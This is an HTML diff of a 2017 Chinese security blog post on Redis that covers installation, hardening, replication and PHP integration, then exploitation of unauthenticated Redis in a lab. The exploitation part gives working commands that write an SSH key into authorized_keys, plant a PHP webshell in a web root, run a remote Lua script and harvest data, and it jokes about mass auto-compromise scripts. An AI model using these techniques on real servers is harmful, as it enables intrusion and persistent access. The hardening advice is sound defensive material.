@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Nosql 攻防第二弹 [ redis ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>Nosql 攻防第二弹 [ redis ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/07/08/nosql-redis/">
+                Nosql 攻防第二弹 [ redis ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-07-08</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/redis/">redis</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>0x01 其实<code>redis</code>跟<code>memcached</code> 单从功用上来讲,基本差不太多,只是在数据量非常大的情况下,memcached 就会有很多的问题,但redis在这方面却恰巧做的还不错,且redis所支持的功能更加全面,也能更好的适应一些比较复杂的业务逻辑,下面则是关于redis的一些优良特性<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">所支持的数据类型较丰富</div><div class="line">支持持久化存储</div><div class="line">支持主从复制</div><div class="line">性能强悍,并发可超十万</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>此次演示环境<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">CentOS6</span><span class="selector-class">.8_x86_64</span>   <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.42</span> 	<span class="selector-tag">Oldlnmp</span>  	<span class="selector-tag">root</span>权限下的<span class="selector-tag">redis</span>未授权</div><div class="line"><span class="selector-tag">CentOS6</span><span class="selector-class">.8_x86_64</span>   <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.66</span> 	<span class="selector-tag">RedisMaster</span> 	为加固过的<span class="selector-tag">redis</span></div><div class="line"><span class="selector-tag">Ubuntu16</span><span class="selector-class">.04</span> <span class="selector-tag">server</span> <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.67</span> 	<span class="selector-tag">RedisSlave</span>	<span class="selector-tag">root</span>权限下的<span class="selector-tag">redis</span>未授权</div><div class="line"><span class="selector-tag">Ubuntu16</span><span class="selector-class">.04</span> <span class="selector-tag">LTS</span>	   <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.12</span>     <span class="selector-tag">Metasploit</span>	为<span class="selector-tag">redis</span>客户端</div><div class="line"><span class="selector-tag">win7cn</span>		   <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.60</span>	后续连<span class="selector-tag">webshell</span>用</div></pre></td></tr></table></figure></p>
+<p>0x02 开始安装部署 redis,此处暂以最新版为例进行演示,为了避免redis自身的一些漏洞,建议使用最新版的稳定版本<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> wget http://download.redis.io/releases/redis-4.0.6.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar xf redis-4.0.6.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> redis-4.0.6</span></div><div class="line"><span class="meta">#</span><span class="bash"> make MALLOC=jemalloc</span></div><div class="line"><span class="meta">#</span><span class="bash"> make PREFIX=/usr/<span class="built_in">local</span>/redis-4.0.6 install</span></div><div class="line"><span class="meta">#</span><span class="bash"> ln -s /usr/<span class="built_in">local</span>/redis-4.0.6/ /usr/<span class="built_in">local</span>/redis</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/redis/bin/:<span class="variable">$PATH</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"export PATH=/usr/local/redis/bin/:<span class="variable">$PATH</span>"</span> &gt;&gt; ~/.bash_profile</span></div><div class="line"><span class="meta">#</span><span class="bash"> redis-server -h</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>0x03 安装成功后,我们就来大致了解下 redis 的目录结构及其内置工具具体用途<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># tree /usr/local/redis</span></div><div class="line">└── bin</div><div class="line">    ├── redis-benchmark			性能测试工具</div><div class="line">    ├── redis-check-aof			检查更新日志</div><div class="line">    ├── redis-check-rdb			检查本地数据库</div><div class="line">    ├── redis-cli			redis客户端连接工具</div><div class="line">    ├── redis-sentinel -&gt; redis-<span class="keyword">server</span></div><div class="line">    └── redis-<span class="keyword">server</span>			redis服务端</div></pre></td></tr></table></figure></p>
+<p>0x04 配置并启动redis服务,它默认工作在tcp的6379端口上</p>
+<p>启动redis前的一些必要准备,主要是修改一些和性能相关的内核参数<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> mkdir /usr/<span class="built_in">local</span>/redis/&#123;config,<span class="built_in">log</span>&#125;</span></div><div class="line"><span class="meta">#</span><span class="bash"> cp /root/redis-4.0.6/redis.conf /usr/<span class="built_in">local</span>/redis/config/</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"vm.overcommit_memory = 1"</span> &gt;&gt; /etc/sysctl.conf</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"net.core.somaxconn = 1024"</span> &gt;&gt; /etc/sysctl.conf</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled"</span> &gt;&gt; /etc/rc.local</span></div><div class="line"><span class="meta">#</span><span class="bash"> sysctl -p</span></div></pre></td></tr></table></figure></p>
+<p>此处的redis配置仅仅只是针对安全方面的一些设置,关于redis的性能和其它功能配置并无涉及<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /usr/local/redis/config/redis.conf		# redis主配置文件,默认在redis源码包目录下</span></div><div class="line">  bind 192.168.3.66 127.0.0.1			# 只允许指定的内网段和本机访问redis</div><div class="line"> <span class="built_in"> port </span>6379					# redis默认工作端口,建议改掉</div><div class="line">  daemonize <span class="literal">yes</span>					# 让它默认就在后台运行</div><div class="line">  pidfile /var/run/redis_6379.pid		# 指定进程文件存放位置</div><div class="line">  loglevel <span class="builtin-name">warning</span>				# 修改的日志记录级别</div><div class="line">  logfile <span class="string">"/usr/local/redis/log/redis_6379.log"</span>	# 指定运行日志存放位置</div><div class="line">  requirepass admin				# 设置登陆密码,此项非常重要,务必要记得开启</div></pre></td></tr></table></figure></p>
+<p>尽量以低权限启动redis服务,<code>此tip非常非常重要</code>,如果你不想让自己的服务器被人秒秒钟入侵,把服务运行权限压缩在一个极小的系统权限下是极度有必要的<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> useradd -r redis</span></div><div class="line"><span class="meta">#</span><span class="bash"> chown -R redis.redis /usr/<span class="built_in">local</span>/redis/<span class="built_in">log</span>/</span></div><div class="line"><span class="meta">#</span><span class="bash"> su - redis</span></div><div class="line"><span class="meta">$</span><span class="bash"> /usr/<span class="built_in">local</span>/redis-4.0.6/bin/redis-server /usr/<span class="built_in">local</span>/redis/config/redis.conf</span></div><div class="line"><span class="meta">$</span><span class="bash"> netstat -tulnp | grep 6379</span></div></pre></td></tr></table></figure></p>
+<p>0x05 如下是 redis 所支持的一些基本数据类型<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">字符串    str</div><div class="line">列表	  list</div><div class="line">集合	  <span class="built_in">set</span></div><div class="line"><span class="built_in">hash</span>类型  <span class="built_in">hash</span></div><div class="line">更多...</div></pre></td></tr></table></figure></p>
+<p>0x06 利用redis客户端连上服务端,手工进行一些常规的增删改查操作</p>
+<p>关于redis终端的基本特性,<code>支持tab键自动补全</code>,直接在redis终端下使用<code>help 命令</code>即可查看指定命令的详细帮助,可以说已经是非常的友好了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># redis-cli -h 192.168.3.66 -p 6379 -a admin  只需指定ip,redis服务端口,正确密码,即可成功连上去</span></div><div class="line"><span class="meta">192.168.3.66:6379&gt;</span> info	 可用来查看redis服务的各种状态信息</div><div class="line"><span class="meta">192.168.3.66:6379&gt;</span> help keys</div><div class="line"><span class="meta">192.168.3.66:6379&gt;</span> help @string</div><div class="line"><span class="meta">192.168.3.66:6379&gt;</span> help @list</div><div class="line"><span class="meta">192.168.3.66:6379&gt;</span> help @set</div><div class="line"><span class="meta">192.168.3.66:6379&gt;</span> help @hash</div><div class="line"><span class="meta">192.168.3.66:6379&gt;</span> keys *</div></pre></td></tr></table></figure></p>
+<p>针对字符串类型的增删改查<br><img src="/img/redis str.png" alt=""></p>
+<p>针对集合类型的增删改查,另外要注意,set是不允许重复的<br><img src="/img/redis set.png" alt=""></p>
+<p>针对列表类型的增删改查<br><img src="/img/redis list.png" alt=""></p>
+<p>针对hash类型的增删改查,这里的数据类型还没说完,关于其余类型下的增删改查基本都差不太多,只是命令,特性不一样而已,换汤不换药,大家可自行尝试<br><img src="/img/redis hash.png" alt=""></p>
+<p>除了在redis终端下进行增删改查,也可直接在shell中无需交互来执行redis内置命令,如下<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># redis-cli -h <span class="number">192.168</span><span class="number">.3</span><span class="number">.66</span> -p <span class="number">6379</span> -a admin set name klion</div><div class="line"># redis-cli -h <span class="number">192.168</span><span class="number">.3</span><span class="number">.66</span> -p <span class="number">6379</span> -a admin monitor</div></pre></td></tr></table></figure></p>
+<p><img src="/img/redis out shell.png" alt=""></p>
+<p>为了防止恶意破坏和部分误操作,可根据自身实际情况针对性禁用一些redis内置危险命令<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">rename</span>-<span class="keyword">command</span> <span class="title">FLUSHALL</span> <span class="string">""</span></div><div class="line"><span class="built_in">rename</span>-<span class="keyword">command</span> <span class="title">CONFIG</span> <span class="string">""</span>   如果不需要用脚本动态改服务配置文件的情况,直接禁用掉即可</div><div class="line"><span class="built_in">rename</span>-<span class="keyword">command</span> <span class="title">EVAL</span> <span class="string">""</span></div><div class="line"><span class="built_in">rename</span>-<span class="keyword">command</span> <span class="title">KEYS</span> <span class="string">""</span></div></pre></td></tr></table></figure></p>
+<p>防止入侵者往authorized_keys文件中新增公钥,可对指定目录和文件进行降权和锁定<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> su - redis</span></div><div class="line"><span class="meta">$</span><span class="bash"> chmod 400 ~/.ssh/authorized_keys</span></div><div class="line"><span class="meta">#</span><span class="bash"> chattr +i ~/.ssh/authorized_keys</span></div><div class="line"><span class="meta">#</span><span class="bash"> chattr +i ~/.ssh	防止入侵者自己新建.ssh目录和authorized_keys文件</span></div></pre></td></tr></table></figure></p>
+<p>尽量不要把redis直接暴露在公网中,如果实在有必要可通过iptables来限制ip访问,比如,只让192.168.3.42这个ip来访问,另外,这里的规则仅作为demo参考,请自行根据实际情况进行调整<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -P INPUT DROP</div><div class="line">iptables -A INPUT -s <span class="number">192.168</span><span class="number">.3</span><span class="number">.42</span> -p tcp --dport <span class="number">6379</span> -j ACCEPT</div></pre></td></tr></table></figure></p>
+<p>关于redis的更多内置命令使用详情,可自行去参考其官方文档,因为并非此处重点,所以就不做详述了,大家也都看到了,使用都非常简单的,只不过实际中,我们可能都是在用其提供的各类脚本api在操作,像这样纯手工增删改查的机会并不多<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span><span class="comment">//redis.io/commands</span></div><div class="line"><span class="symbol">http:</span><span class="comment">//doc.redisfans.com/   中文版</span></div></pre></td></tr></table></figure></p>
+<p>0x07 关于 redis 主从同步简单实现,其实也非常简单,主库上不用做任何配置,只需要<code>在从库配置文件中指定主库的ip,服务端口和正确密码</code> 之后重启服务即可,至于redis的负载均衡实现,在做好主从同步后就更简单了,并非重点,此处不再赘述<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># vi /usr/local/redis/config/redis.conf 只需要编辑从库配置文件,开启如下两项即可</div><div class="line">  slaveof <span class="number">192.168</span><span class="number">.3</span><span class="number">.66</span> <span class="number">6379</span></div><div class="line">  masterauth admin</div></pre></td></tr></table></figure></p>
+<p><img src="/img/redisslave.png" alt=""></p>
+<p>0x08 编译安装php的redis客户端扩展<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> wget https://pecl.php.net/get/redis-3.1.2.tgz</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar xf redis-3.1.2.tgz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> redis-3.1.2</span></div><div class="line"><span class="meta">#</span><span class="bash"> /usr/<span class="built_in">local</span>/php/bin/phpize</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./configure --with-php-config=/usr/<span class="built_in">local</span>/php/bin/php-config</span></div><div class="line"><span class="meta">#</span><span class="bash"> make &amp;&amp; make install</span></div><div class="line"><span class="meta">#</span><span class="bash"> ls /usr/<span class="built_in">local</span>/php-5.6.32/lib/php/extensions/no-debug-non-zts-20131226/</span></div><div class="line"><span class="meta">#</span><span class="bash"> vi /usr/<span class="built_in">local</span>/php/etc/php.ini</span></div><div class="line">  extension_dir = "/usr/local/php-5.6.32/lib/php/extensions/no-debug-non-zts-20131226/"</div><div class="line">  extension=redis.so</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"> pkill php-fpm</span></div><div class="line"><span class="meta">#</span><span class="bash"> /usr/<span class="built_in">local</span>/php/sbin/php-fpm</span></div><div class="line"><span class="meta">#</span><span class="bash"> lsof -i :9000</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/redis php.png" alt=""></p>
+<p>0x09 对我们来讲,最值得关注的可能还是redis 的一些安全问题,当然,不可否认的是,敏感信息泄露确实是一方面,但最臭名昭著的可能还是<code>未授权访问</code>,运气好的情况下,你甚至会碰到直接root权限的redis未授权,关于此错误配置的一些简单粗暴的利用方式,如下</p>
+<p>0x10 在开始具体的利用之前,我们先来简单了解下什么是<code>config</code><br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">config 命令本身是为动态调整Redis服务配置文件而无须重启设计的,既然是写文件,只要权限够,我们一样也可以用它来写各种<span class="keyword">shell</span><span class="bash"></span></div><div class="line">至于你要把这个shell写到哪里,随你便,权限只要在手,衍生出来的思路和技巧是无穷的,比如,你甚至可以想办法直接弹个meterpreter回来都是可以的</div></pre></td></tr></table></figure></p>
+<p>0x11 几种具体的利用方式,如下</p>
+<p>第一种,直接以root身份启动redis服务,可尝试<code>写ssh key</code>,但想利用成功是有前提的,首先,目标机器必须已事先开启ssh key登录,因为那个<code>.ssh目录</code>默认是不存在的,其次,目标机器的ssh服务端口必须允许外连,否则即使写进去了,不让连也是尴尬,最后,还需要ssh服务配置中允许root用户直接ssh远程连才可以<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ssh-keygen -t rsa	 生成密钥对,把公钥丢给目标,等会儿我们用私钥去连</span></div><div class="line"><span class="comment"># (echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") &gt; shell.txt</span></div><div class="line"><span class="comment"># cat shell.txt | redis-cli -h 192.168.3.42 -x set rootkit</span></div><div class="line"><span class="comment"># redis-cli -h 192.168.3.42</span></div><div class="line">192.168.3.42:6379&gt;<span class="built_in"> config </span><span class="builtin-name">set</span> dir /root/.ssh/	可以暂且把它理解成往这个目录下写shell</div><div class="line">192.168.3.42:6379&gt;<span class="built_in"> config </span><span class="builtin-name">get</span> dir</div><div class="line">192.168.3.42:6379&gt;<span class="built_in"> config </span><span class="builtin-name">set</span> dbfilename <span class="string">"authorized_keys"</span>	指定数据文件名</div><div class="line">192.168.3.42:6379&gt; save</div></pre></td></tr></table></figure></p>
+<p><img src="/img/redis ssh key.png" alt=""></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">ssh</span> <span class="selector-tag">-i</span> <span class="selector-tag">id_rsa</span> <span class="selector-tag">root</span>@<span class="keyword">192</span>.<span class="keyword">168</span>.<span class="keyword">3</span>.<span class="keyword">42</span>	最后,在本地直接用私钥连到目标机器上即可</div></pre></td></tr></table></figure>
+<p><img src="/img/redis ssh key res.png" alt=""></p>
+<p>第二种,root权限下利用redis在远程机器上执行lua脚本,本来想直接用lua弹个shell回来的,只不过暂时还不太完美,后续搞定会再更新上来 ^_^<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># <span class="keyword">cat</span> <span class="keyword">shell</span>.<span class="keyword">lua</span></div><div class="line"># redis-cli --<span class="built_in">eval</span> <span class="keyword">shell</span>.<span class="keyword">lua</span> -h <span class="number">192.168</span>.<span class="number">3.67</span> -<span class="keyword">p</span> <span class="number">6379</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/redis lua revese shell.png" alt=""></p>
+<p>第三种,低权限启动redis服务,先想办法找到目标网站的物理路径,然后再尝试往目标站点目录中写webshell,当然啦,这个想利用成功也是有前提的,首先,redis和web必须处在同一机器上,如果站库分离就不太好写了<code>哼哼...但实际中,绝大部分都是站库分离</code>,其次,web服务用户和redis服务用户最好为同一系统用户,否则很可能会出现网站目录写不进去的情况,在实战中写webshell这种利用场景往往更适合windows,嘿嘿……以后大家就会懂的<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># redis-cli -h 192.168.3.42</span></div><div class="line">192.168.3.42:6379&gt;<span class="built_in"> config </span><span class="builtin-name">set</span> dir /usr/local/nginx/html/bwapp/bWAPP/</div><div class="line">192.168.3.42:6379&gt;<span class="built_in"> config </span><span class="builtin-name">set</span> dbfilename licens.php</div><div class="line">192.168.3.42:6379&gt; <span class="builtin-name">set</span> klion <span class="string">"&lt;?php <span class="variable">$sl</span> = create_function('', @<span class="variable">$_REQUEST</span>['request']);<span class="variable">$sl</span>();?&gt;"</span></div><div class="line">192.168.3.42:6379&gt; save</div></pre></td></tr></table></figure></p>
+<p><img src="/img/redis webshell.png" alt=""><br><img src="/img/redis webshell res.png" alt=""></p>
+<p>第四种,在redis服务低权限下也可尝试从中搜集各类敏感信息,如各类账号密码…<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># redis-cli -h <span class="number">192.168</span><span class="number">.3</span><span class="number">.67</span> -p <span class="number">6379</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/redis info.png" alt=""></p>
+<p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;服务本身使用上非常简单,也没什么太多好说的,权限够的情况下,其实还可以衍生出非常非常多的利用手法,这里就不一一细说了,大家如果有兴趣,可以写成批量脚本,全网全自动一键抓鸡,<code>自动验证权限并弹shell...</code>没事儿,放哪儿天天让它自己跑就行了,哼哼……不说多了,不然有点儿那啥了,毕竟还是希望大家利用技术去做正确且有意义的事情,绝无任何教唆的意思,最后,欢迎大家一起来交流,祝好运 ^_^</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/redis/">#redis</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
